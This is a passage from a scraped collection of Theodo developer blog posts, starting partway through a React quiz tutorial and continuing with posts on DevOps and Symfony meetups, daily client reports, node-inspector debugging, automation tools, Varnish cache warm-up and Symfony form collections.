},\r\n        ...\r\n      ]\r\n    }\r\n    ...\r\n  ]\r\n}\nOur component has all the data it needs to display a quiz. We can add a few methods to make it dynamic: go to the next question, add a user answer, compute the current score:\nnextStep: function(){\r\n  this.setState({step: (this.state.step + 1)});\r\n},\r\n\r\nsetAnswer: function(event){\r\n  this.state.user_answers[this.state.step] = this.state.user_answers[this.state.step] || [];\r\n  this.state.user_answers[this.state.step][parseInt(event.target.value)] = event.target.checked;\r\n},\r\n\r\nisAnswerRight: function(index){\r\n  var result = true;\r\n \r\n  Object.keys(this.state.quiz.questions[index].answers).map(function(value, answer_index){\r\n    var answer = this.state.quiz.questions[index].answers[value]\r\n    if (!this.state.user_answers[index] || (answer.is_right != (this.state.user_answers[index][value] || false))) {\r\n      result = false;\r\n    }\r\n  }.bind(this));\r\n  return result;\r\n},\r\n\r\ncomputeScore: function(){\r\n  var score = 0\r\n  Object.keys(this.state.quiz.questions).map(function(value, index){\r\n    if (this.isAnswerRight(index)) {\r\n      score = score + 1;\r\n    }\r\n  }.bind(this));\r\n  return score;\r\n},\nFinally we can write the render method. We want our component to display two types of screen; a question with its available answers and the result of a quiz session. Our main render calls one of them based on the current state:\nrender: function(){\r\n  if (!this.state.quiz.questions) {return <div></div>}\r\n  return (\r\n    <div>\r\n      <h1>{this.state.quiz.title}</h1>\r\n      {(this.state.step < this.state.quiz.questions.length\r\n        ? (<Question\r\n            id={this.state.step}\r\n            data={this.state.quiz.questions[this.state.step]}\r\n            validateAnswers={this.nextStep}\r\n             setAnswer={this.setAnswer}/>)\r\n        : (<div>{this.renderResult()}</div>)\r\n      )}\r\n    </div>\r\n  )\r\n}\r\n\nThe Question component simply defines a render method using properties given by Quiz component, and calls callbacks when the user interacts with it:\nvar React = require('react');\r\nvar Question = React.createClass({\r\n  propTypes: {\r\n    setAnswer: React.PropTypes.func,\r\n    validateAnswers: React.PropTypes.func,\r\n    data: React.PropTypes.obj\r\n  },\r\n\r\n  render: function(){\r\n    var answersNodes = Object.keys(this.props.data.answers).map(function(value, index){\r\n      return (\r\n        <div>\r\n          <input\r\n            id={\"answer-input-\" + index}\r\n            type=\"checkbox\"\r\n            value={value}\r\n            onChange={this.props.setAnswer}\r\n            defaultChecked={false}/>\r\n          <label htmlFor={\"answer-input-\" + index}>\r\n            {(parseInt(index) + 1) + \": \" + this.props.data.answers[index].value}\r\n          </label>\r\n        </div>\r\n      )\r\n    }.bind(this));\r\n\r\n    return (\r\n      <div>\r\n        <h4>{(parseInt(this.props.id) + 1) + \": \" + this.props.data.question}</h4>\r\n        <form>\r\n          {answersNodes}\r\n        <br/>\r\n        <button type=\"button\" onClick={this.props.validateAnswers}>\r\n          Validate answer\r\n        </button>\r\n        </form>\r\n      </div>\r\n    );\r\n  }\r\n});\r\nmodule.exports = Question;\r\n\nrenderResult calls the isAnswerRight method to list result for each question:\nrenderResult: function(){\r\n  var result = Object.keys(this.state.quiz.questions).map(function(value, index){\r\n    if (this.isAnswerRight(value)) {\r\n      return (<div>{\"Question \" + index + \": You were right!\"}</div>)\r\n    } else {\r\n      return (<div>{\"Question \" + index + \": You were wrong!\"}</div>)\r\n    }\r\n  }.bind(this));\r\n}\r\n\nInstallation\nYou can locally install the project on your computer.\nRequirements: npm must be installed on your computer, you can use httpster to serve the files.\ngit clone git@github.com:bbonny/quiz-react.git\r\ncd quiz-react\r\nnpm install\r\n./node_modules/gulp/bin/gulp.js\nIn an other, shell launch httpster:\ncd quiz-react/dist\r\nhttpster\r\n\nYou can now access the quiz locally: http://localhost:3333\nGithub\nFull source code can be found here: https://github.com/bbonny/quiz-react/\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tBenjamin Bonny\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis blog post is in French as the event it relates to is French-only.\nComme tous les premiers mardi du mois, le groupe Paris Devops a organis\u00e9 son meetup, cette fois-ci dans les locaux de Dailymotion. Paris Devops est un groupe qui promeut la culture DevOps dans le milieu de l\u2019entreprise.\n\nUn Open Space pour mieux discuter\nAlors que c\u2019\u00e9tait ma premi\u00e8re participation \u00e0 ce meetup, j\u2019ai \u00e9t\u00e9 agr\u00e9ablement surpris par le format propos\u00e9 pour cette soir\u00e9e. Apr\u00e8s une pr\u00e9sentation de 30-45 minutes et le pot habituel, la s\u00e9ance s\u2019est transform\u00e9e en Open Space, ce qui a ouvert le terrain \u00e0 plusieurs sujets de discussion tr\u00e8s int\u00e9ressants.\nPour ceux qui ne sont pas familiers avec le d\u00e9roulement d\u2019un Open Space, les grandes lignes en sont :\n+ Toute personne peut proposer un sujet de discussion\n+ Chacun vote pour les sujets qu\u2019il souhaite\n+ Les sujets principaux sont r\u00e9partis en diff\u00e9rents lieux et cr\u00e9neaux horaires\n+ Chacun est ensuite libre de choisir l\u2019endroit o\u00f9 il souhaite se rendre pour participer \u00e0 la discussion\nD\u2019autres r\u00e8gles sont mises en place pour faciliter son bon fonctionnement, qui sont r\u00e9sum\u00e9es ici.\nUne question r\u00e9currente : Comment convaincre et r\u00e9pandre la philosophie Devops autour de soi\nParmi les trois sujets de discussion auxquels j\u2019ai pu participer lors de cette soir\u00e9e, deux touchaient du doigt la m\u00eame probl\u00e9matique : le partage de la culture DevOps autour de soi.\nDans les deux cas, le principal probl\u00e8me des personnes ayant propos\u00e9 leur exp\u00e9rience \u00e0 la discussion semblaient frustr\u00e9s par un manque de communication entre les traditionnels \u201cdev\u201d et \u201cops\u201d.\nLa s\u00e9curit\u00e9 : l\u2019affaire de tous\nPar exemple, l\u2019initiateur d\u2019un de ces sujets, ayant un r\u00f4le d\u2019administrateur r\u00e9seau dans son entreprise, regrettait un manque d\u2019int\u00e9r\u00eat de la part des d\u00e9veloppeurs \u00e0 propos des questions de s\u00e9curit\u00e9 informatique et cherchait des moyens d\u2019arriver \u00e0 sensibiliser tout le monde \u00e0 ces questions.\nA l\u2019heure actuelle, il lui arrivait encore fr\u00e9quemment, avec son \u00e9quipe, de devoir corriger lui-m\u00eame des failles de s\u00e9curit\u00e9 dans le code pr\u00eat \u00e0 \u00eatre d\u00e9ploy\u00e9 en production, ce qui arriverait bien plus rarement si les d\u00e9veloppeurs \u00e9taient conscients et attentifs \u00e0 ces questions.\nUn point soulev\u00e9 lors de cette discussion, et que j\u2019ai trouv\u00e9 int\u00e9ressant, \u00e9tait que la mise en place d\u2019outils automatiques pour d\u00e9tecter les failles connues ou monitorer le code produit n\u2019\u00e9tait en aucun cas une solution p\u00e9renne. Pour les personnes pr\u00e9sentes, cela revenait plut\u00f4t \u00e0 vouloir mettre un sparadrap sur la fissure d\u2019un mur.\nEn effet, plus la s\u00e9curit\u00e9 mise en place du c\u00f4t\u00e9 des administrateurs r\u00e9seau est importante, moins les d\u00e9veloppeurs ont \u00e0 \u00eatre vigilants sur la qualit\u00e9 du code produit. Cette baisse de vigilance entra\u00eene la multiplication de failles de s\u00e9curit\u00e9 dans le code d\u00e9livr\u00e9 pour la mise en production.\nLa d\u00e9monstration par l\u2019exemple est sortie du d\u00e9bat comme une solution efficace, point auquel je me rallie facilement apr\u00e8s en avoir fait l\u2019exp\u00e9rience lors de notre s\u00e9jour \u00e0 Amsterdam pour la Velocity Conf.\nLes cr\u00e9ateurs de Snyk, un outil pr\u00e9sent\u00e9 en plus grand d\u00e9tail par Woody Rousseau, ont, depuis la sc\u00e8ne de l\u2019amphith\u00e9\u00e2tre, d\u00e9montr\u00e9 comment des hackers pouvaient profiter de failles connues, et pr\u00e9sentes dans certains packages NPM que nous utilisons, pour d\u00e9naturer le contenu d\u2019un site voire \u00e9teindre le serveur sur lequel se trouve ce site !\nCulture Ops : comment l\u2019acqu\u00e9rir ?\nL\u2019autre discussion traitait de l\u2019opposition entre quelqu\u2019un et son manager \u00e0 propos de la formation Ops donn\u00e9e aux d\u00e9veloppeurs de son entreprise. Ce responsable ne voulait pas que les d\u00e9veloppeurs utilisent un provisioning Ansible que cette personne avait cr\u00e9\u00e9e, parce qu\u2019il estimait n\u00e9cessaire que ses d\u00e9veloppeurs apprennent \u00e0 monter leur machine depuis la base \u00e0 la main plut\u00f4t que d\u2019utiliser un provisioning tout fait.\nLa discussion tournait donc sur la mani\u00e8re de pr\u00e9senter les nouveaux outils de d\u00e9ploiement \u00e0 ce responsable ainsi qu\u2019aux autres d\u00e9veloppeurs, \u00e0 le faire par exemple progressivement pour que les d\u00e9veloppeurs gardent une part active dans la construction du provisioning et apprennent \u00e0 ma\u00eetriser ces outils modernes.\nUn meetup int\u00e9ressant, ouvert et qui ne demande qu\u2019\u00e0 prendre de l\u2019ampleur\nCette soir\u00e9e a \u00e9t\u00e9 un tr\u00e8s bon moment. Les questions \u00e9taient tr\u00e8s ouvertes et pertinentes, nous concernant tous dans notre travail de tous les jours.\nLes diff\u00e9rentes personnes personnes pr\u00e9sentes lors de cette soir\u00e9e ont pu apporter des r\u00e9ponses toujours int\u00e9ressantes aux questions pos\u00e9es.\nMalgr\u00e9 tout, ce meetup reste encore assez peu connu et se d\u00e9roule en petit comit\u00e9 (~30 personnes). Alors si vous avez envie de d\u00e9couvrir un peu plus les dessous de la philosophie DevOps, de voir quelles sont les questions qui sont pos\u00e9es autour de ce sujet ou d\u2019apporter votre exp\u00e9rience quant \u00e0 sa mise en pratique, n\u2019h\u00e9sitez surtout pas et suivez leur actualit\u00e9 sur leur site.\nA tr\u00e8s bient\u00f4t lors de leur prochain meetup !\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tTristan Pouliquen\r\n  \t\t\t\r\n  \t\t\t\tFullstack Web developer at Theodo, and curious about any new technology!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tWho is your client?\nIn every professional relation, you have a provider and a client. Whether she\u2019s your boss or the head of a company you\u2019re dealing with, the client is the one you are creating value for and she is the one you want to bring onboard.\nAt Theodo we help our clients to solve their business problems with code. It is crucial to us that the people at the company we work with \u2013 who often don\u2019t get anything about coding \u2013 understand our progress towards the goal we determined together. Which means we need to make visible to them the value we add.\nIdeally, we\u2019d work side-by-side with our clients. They\u2019d see us working and we\u2019d show them our deliverable right when we are done. Unfortunately, although they are the ones with the business vision, they\u2019re never full time on our project and tend to be busy with other subjects. As for technical teams, the complexity of our topic makes it even harder to keep them onboard.\nSo we asked ourselves how to provide transparency to our clients and came out with a powerful tool.\nFirst, what do we need?\nWe agreed on 4 criteria:\n\neasy to get and targeted: decision-makers are busy people. They want straight-to-the-point info. No noise. With the most important information made blatant.\nunderstandable for outsiders: your clients have providers themselves and they need to report to someone as well. They need jargon-free reports they can transmit to their clients.\ndaily-basis: to maintain contact and allow to be reactive in case of problem.\neasy and fast to produce: transparency is essential for the success of a project but is not an end in itself. The time to write this report should not spill over your work. The maximum timebox for this exercise should be 15 minutes. Done is better than perfect.\n\nSecond, what do we do?\nLet us introduce you to The Theodo Daily Mail\u2122.\nIt\u2019s a simple and short document with key characteristics:\n\nThe short-term objective set for your team (i.e. number of sales completed during a month, number of recruitments achieved, features developed, etc.)\nOne key metric updated on a daily-basis (and presented in a visual manner)\nA check on the goals your team committed to the day before\nA forecast of the goals you want to reach today\nA list of the problems you\u2019re facing and the actions you plan on taking to solve them\n\n\nIn addition, here are 2 pieces of advice we\u2019d like to share: keep your style sober and be precise.\nColors need to be meaningful: use colors as signals, and keep them seldom. At Theodo, for instance, we agreed that we only needed green and red to highlight whether we reached our goals for the day before or not. Same for fonts, sizes and decoration: if you\u2019re going to use them, make sure they help understand your message better, otherwise they add nothing but noise.\nMost importantly, be accurate in your report. Precision is key: use actual facts (how many sales appointments did you get?, how many applicants did you meet?, what functionality exists today that didn\u2019t yesterday?). And please, write sentences with action verbs, active forms and check dates. Especially when it comes to problem-solving. Instead of writing \u201cthe last functionalities need to be validated\u201d, prefer \u201cSteve, can you validate that the signup form we developed works? We\u2019ll make a check at 3pm today\u201d. \nAfter months of experimentations, here\u2019s what we\u2019ve learned.\nSo, third,what\u2019s the outcome?\nOur Daily Mail was meant to solve the transparency issue (\u201chow do I show the value I create for my client\u201d) and here are two examples of feedbacks we got.\nI had no idea of what you (the IT team) were doing, now it\u2019s super clear. I know exactly what to expect today. Thanks.Yahya Tahri, Product Strategy Manager BNP Paribas Investment Partners\nI forwarded it to the head of IT of my main investor to show them our progress.The CEO of a cool start-up we worked for\nWe realized that not only we managed to give more information to our interlocutors and create trust but we also gave them a tool to communicate with their own clients. Digging deeper, we realized that there were other unexpected advantages to our Daily Mail. Here is what we found:\n\nWriting a Daily Mail makes you ask yourself consistent questions everyday. It brings discipline to yourself and the team. It forces you to formulate problems you encounter and track the effect of the actions you take. In other words it helps you begin a continuous improvement process.\nWith Daily Mails, teams share indicators to communicate their progress towards measurable goals. But the report itself is an indicator of the team\u2019s motivation: motivated teams write efficient and meaningful Daily Mails. If the reports you get don\u2019t match the 4 criteria we listed above, you should see that as a problem and take actions to react.\nWhen you set daily goals, you commit yourself to them. It reinforces your engagement to make the team and the project succeed.\n\nLet\u2019s keep going\nAt Theodo we are strong Scrum advocates. As praised by the very official Scrum Guide, we believe that Transparency, Inspection and Adaptation are key pillars to help teams improve continuously and eventually succeed in their projects. We found that writing Daily Mails was instrumental in implementing such a process within development teams.\nThe Theodo Daily Mail\u2122 is one version of this virtuous report we tried to define. It\u2019s still a work in progress and we\u2019d be happy to have your feedback to improve it.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tNicolas Girault\r\n  \t\t\t\r\n  \t\t\t\tNicolas is a web developer eager to create value for trustworthy businesses.\r\nSurrounded by agile gurus at Theodo, he builds simple solutions along with tech-passionates.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRodolphe Darves Bornoz\r\n  \t\t\t\r\n  \t\t\t\tRodolphe is a former entrepreneur and a business developer. After making all the mistakes in the book launching his first startup he joined Theodo to learn the fast way and get ready to start a new venture.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tTheodo est heureux d\u2019accueillir le Symfony Pot du mois d\u2019octobre\u00a0!\nTout d\u2019abord un petit mot sur les fameux SfPot (pour les intimes \ud83d\ude09 ). Le principe est de se regrouper un soir par mois autour de 2-3 talks en lien avec Symfony. Les sujets restent n\u00e9anmoins tr\u00e8s ouverts et vari\u00e9s car un d\u00e9veloppeur Symfony pourra \u00e9galement utiliser d\u2019autres outils comme React, Travis ou Capistrano\u2026 Les SfPot sont organis\u00e9s par l\u2019AFSY le 3\u00e8me mardi du mois. Les talks sont suivis d\u2019un moment plus informel autour d\u2019un pot et cette fois c\u2019est Theodo qui r\u00e9gale\u00a0!\nCette session commencera \u00e0 19h30 avec :\n\nMatthieu Moquet de BlaClaCar, qui nous parlera de \u00ab CQRS & Event sourcing \u00bb\nR\u00e9my Luciani de Theodo, qui enchainera sur \u00ab Le guide du d\u00e9veloppeur agile \u00bb\n\nEnsuite on se retrouvera autour de pizzas et de quelques boissons jusqu\u2019\u00e0 22h environ. Alors\u2026 inscrivez-vous au meetup\u00a0!\nTheodo est \u00e9galement pr\u00e9sent \u00e0 d\u2019autres Meetup (NodeJS, AngularJs, ReactJS\u2026) et notamment aux pr\u00e9c\u00e9dents Human Talk. On se fera un plaisir de vous y croiser\u00a0!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tReynald Mandel\r\n  \t\t\t\r\n  \t\t\t\tAfter two start-ups creations in web & photography, Reynald joined Theodo to sharpen his skills in Symfony2 and in development in general. As an architect-developper and coach, he helps the teams & the clients to succeed in their projects and use the best practices both in code and agile methodology.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tAs a developer, you get to debug your code very often. In JavaScript this is done\nin the browser. Each browser having a different debugger, you may find out some\nbetter than others but the truth is they are all very handy. However, this is for\nin-browser JavaScript. What about server side JavaScript, the one you run\nwith node, iojs or some sexy compiler like coffee?\nUsual front-end debugging\nA lot of developers still use those ugly, yet handy console.log all around\nthe code to test the content of variables. This is usually a poor practice.\nPlacing a debugger instruction or, even better, using breakpoints, pauses the\nexecution workflow and lets you use watchers and the console to see the content\nof the variables and to play around with them.\n\nBut this is only for front-end code, isn\u2019t it?\nNope.\nYou can actually use the same debugger interface for your Node.js app and\nforget about the console debugger, which is fully functional but feels slower\nto use because you need to use lines number to place breakpoints.\n\nBetter back-end debugging\nIn order to get that nice debugging interface we need to use either Chrome or\nOpera, and to use the node-inspector node package. Install it globally:\nnpm install -g node-inspector\r\n\nIf your application is written in JavaScript or if you have a js version of it\nyou can directly run your server and debugger with:\nnode-debug --no-preload server.js\r\n\nI recommend using the --no-preload option since I have had big delays when not using it. It\u2019s up to you to play around with it!\nThis will run your server and also serve a webpage containing the debugger. By\ndefault this is run on port 8080, so you may need to change it using the -p\noption. If your default browser is Chrome or Opera, this will also open it on a\nnew tab. Otherwise you will have to open it by yourself.\nYou will have access to a nifty interface. It\u2019s basically the browser\u2019s debugger\nin fullscreen.\n\nUsing it with CoffeeScript (or any other compiler/transpiler)\nIn order to launch the debugger with compilers like CoffeeScript, you\u2019ll have to\nlaunch two different processes. One for your server and another for the debugger\ninterface.\nWhen starting the server you must make it listen for debugger instructions. This\nmay vary depending on the compiler/transpiler. For CoffeeScript you can directly\npass options to the node command:\nTherefore instead of doing\nnode --debug app.js\r\n\nYou can write:\ncoffee --nodejs --debug app.coffee\r\n\nThis will listen for debugging instructions on port 5858 (can be modified). We\ncan now launch the debugger interface with:\nnode-inspector\r\n\nAgain, if your default browser is Chrome or Opera, this will also open it on a\nnew tab. Otherwise you will have to open it by yourself.\nRunning inside a virtual machine or container\nIf you run your code inside a docker container or\nvagrant virtual machine, you will notice this\ndoesn\u2019t work. Furthermore where should you launch the inspector from?\nBefore going on, I would like to recall about the ports. In order to use\nnode-inspector, we need to use two different ports:\n\nThe debugger port, which defaults to 5858. This allows our two processes\nto communicate together. This can be changed by directly passing an argument\nto the debug option: --debug=5856\nThe interface port, which defaults to 8080. This is basically a web server\nthat allows us, the developer, to place breakpoints, live edit the code,\netc. You can set this port by passing the web-port option with a parameter\n-web-port 10100.\n\nIf those ports are already being used by some processes you will have to use\nthe options mentioned above. Understanding this will help you not to mess up.\nYet this is not enough. When running a server within a container, you also need\nto run the node-inspector inside the container. Therefore you need to set the\naddress of the web server to match container\u2019s.\nExample\nTo put it in a nutshell, let\u2019s say I am running my server inside a vagrant with\na local ip of 199.199.199.42. Also I am already using the ports 5858 and 8080 so\nI\u2019ll have to use others.\nIf you want to test you can use the simple js file:\nvar http = require('http');\r\n\r\n// I won't be able to use it for the debugger interface\r\nconst PORT = 8080;\r\n\r\nfunction handleRequest(request, response) {\r\n  response.end('It Works!! Path Hit: ' + request.url);\r\n}\r\n\r\nvar server = http.createServer(handleRequest);\r\n\r\nserver.listen(PORT, function() {\r\n  console.log(\"Server listening on: http://localhost:%s\", PORT);\r\n});\r\n\nFirst, start the server in debug mode:\nnode --debug=5656 server.js\r\n\nThen start the node-inspector:\nnode-inspector --web-host=199.199.199.42 --debug-port=5656 --web-port=10100 --no-preload\r\n\nThis will output something like Visit http://199.199.199.42:10100/?ws=199.199.199.42:10100&port=5656 to start debugging. and won\u2019t open a tab on your browser.\nFinally go to the provided address on your host and start debugging!\nSide notes\n\nIt is important to note the difference between node debug server.js and node --debug server.js. The first one will directly launch the debugger on the\nconsole while the second one opens a port to listen for debugging instructions.\nYou can also break right after launching the application by using the\n--debug-brk option. Which is useful to manually enter some breakpoints at\ngiven lines\nLong parameters were used to improve readability:\n\n--web-port can be shortened to -p\n--debug-port can be shortened to -d\n\n\n\n\u00a0\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tEduardo San Martin Morote\r\n  \t\t\t\r\n  \t\t\t\tEduardo, aka posva, loves development tools and enjoy creating libs. He prefers should over expect and hates technical debt  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tSourcing candidates for recruitment, managing your online reputation, populating databases\u2026 did you ever dream about a tool that does all these repetitive and boring tasks for you?\n1. profilr.co\nThis app uses Google search engine to generate advanced search among thousands of profiles on social networks corresponding to your criteria.\nExamples:\n\nRuby developers in San Francisco on Linkedin\nPeople working at Google on Google+\nDesigners in Berlin on Dribbble\n\n2. buffer.com\nBuffer is an awesome company that advocates transparency. They provide a simple and easy social media scheduling.\nYou can add updates to your Buffer queue and they will be posted for you well spaced out over the day and at the best times.\nIt\u2019s like your magic box you can fill up anytime with great Tweets, Facebook stories or LinkedIn updates. Just drop them in and you don\u2019t have to ever worry about when it will be posted, Buffer takes care of it for you.\nBuffer provides Chrome, Firefox and Safari plugin to post from any website without ever needing to visit Twitter, Facebook on LinkedIn.\nBonus: buffer.com/pablo\n3. ifttt.com\n\u201cIf This Then That\u201d allows you to perform an action whenever another one is triggered. You can basically use it as a glue between two services\n\nBonus: do more with just a tap. Configure a repetitive task and execute it by taping on your smartphone.\n\n4. zapier.com\nConnect the apps you use, automate tasks, get more out of your data. Similar to IFTTT but it provides more apps and options such as reading Google spreadsheet or Trello cards. I use it to backup all my tweets in a spreadsheet to make research easier later.\n5. netvibes.com/dashboardofthings\nLast apps connector but not least, Dashboard of Things by our friends from Netvibes. Similar to Zapier but provides more conditionnal trigger. You can add threshold and `else` condition.\n6 examples of `potions`:\n\nYou can create all `potions` you want using all these `ingredients`. Enjoy!\n6. import.io\n\n\u201cInstantly turn web pages into data\u201d. Feed it with some url and it will automatically parse the webpage and extract the main collection. Then you can choose to export data into .csv file, Google Sheets or generate an API.\n7. kimonolabs.com\n\u201cTurn websites into structured APIs from your browser in seconds\u201d. It\u2019s a import.io competitor with more options.\n8. Google apps\nLast but not least, Google apps. You can easily connect them together.\nFor example, I use Google Analytics to collect customer insights. Then I import it in a Google Sheet with a Spreadsheet plugin and generate graphs. Finally I share those graphs on a Google Sites open to the company organization. The result is a Website Analytics Dashboard for the company without typing one line of code.\n9. What are yours?\nYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tJonathan Beurel\r\n  \t\t\t\r\n  \t\t\t\tJonathan Beurel - Web Developer. Twitter : @jonathanbeurel  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tCaching data with varnish allows to deal with heavy data traffic at a limited cost.\n\nThe question is, how can I serve fresh data even if no one have requested them recently? The solution is to request your cache regularly.\n\nThis is how I managed to auto warm up a list of URLs in my varnish cache every hour.\n\nFirst, I add the urls I want refreshed in a urls.txt file like this:\n/dashboard/1\r\n/dashboard/2\r\n/dashboard/3\r\n\nNote that this url list is static but you can easily feed it automatically with a background job of yours.\n\nThen, I need to add specific code to my config.vcl file:\nacl warmuper_ip {\r\n    \"10.20.30.40\";\r\n}\r\n\r\nsub vcl_recv {\r\n    # the script varnish-cache-warmup.sh must always refresh the cache\r\n    if (client.ip ~ warmuper_ip && req.http.Cache-Control ~ \"no-cache\") {\r\n        set req.hash_always_miss = true;\r\n    }\r\n}\r\n\nThen, I create a\u00a0varnish-cache-warmup.sh script to actually warmup the varnish cache:\n#!/bin/bash\r\nwget --output-document=/dev/null --header='Cache-Control: no-cache' --tries=1 --quiet --base=http://domain.com --input-file=/path/to/urls.txt\r\n\nIn order to test your script you\u2019ll have to look at varnish logs. Here is a command that may help\u00a0varnishlog -c | grep ReqURL.\nEventually, I add this cron task with crontab -e:\n0 * * * * cd /path/to/varnish-cache-warmup.sh\nAnd that is it!\n\nHere are some helpful resources:\n\nhttp://info.varnish-software.com/blog/warming-varnish-cache-varnishreplay\nhttp://www.htpcguides.com/smart-warm-up-your-wordpress-varnish-cache-scripts/\nhttps://stackoverflow.com/questions/14210099/varnish-cache-initial-cache-of-web-pages\nhttps://github.com/aondio/Varnish-Cache-Warmup/blob/master/warmup.sh\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tRapha\u00ebl Dubigny\r\n  \t\t\t\r\n  \t\t\t\tRapha\u00ebl is an agile web developer at Theodo. He uses angular, nodejs and ansible every day.  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tEach time you use\u00a0form collections\u00a0in Symfony, you need to write some JavaScript.\nThe cookbook\nIf you don\u2019t know what form collections are you won\u2019t be interested in\u00a0this article now. However you can read\u00a0the cookbook\u00a0out of curiosity and come back read this article later.\nDoing form collections with Symfony can be a tedious task because\u00a0Symfony doesn\u2019t (and shouldn\u2019t) embed the JavaScript to have a basic\u00a0but working form collections out of the box.\nIn order to make it work you have to \u201ccopy\u201d and adapt some JavaScript\u00a0from\u00a0the cookbook. You\u00a0may even be tempted to duplicate this JavaScript code accross your project.\nA simple JavaScript file to the rescue\nTherefore I wrote a single JavaScript file to help regarding this\u00a0matter. You can find it\u00a0here. In\u00a0this repository\u00a0there is a complete\u00a0documentation\u00a0and some\u00a0examples.\nThe JavaScript file relies on html classes to enable the default\u00a0behavior of adding and deleting elements to/from your collection thus\u00a0your work is to add the classes in your template files. For the most\u00a0simple cases you won\u2019t need to write a single line of JavaScript.\nThe JavaScript code throws events before and after each action to let\u00a0you customize each behavior. Each class or event name can be\u00a0configured to your need at different levels.\nDespite the customization options, if you have to implement complex\u00a0behaviors, this file may not be a solution for you. Nevertheless you\u00a0can modify it to suit your needs.\nNext step\nTry it\u00a0on your computer.\nIf you\u2019ve never done form collections with Symfony before, you really\u00a0should follow\u00a0the cookbook\u00a0in order to understand how Symfony works with form collections.\nIf you want to know more about what is possible, you may want to read\u00a0the\u00a0documentation.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tjeanlucc\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
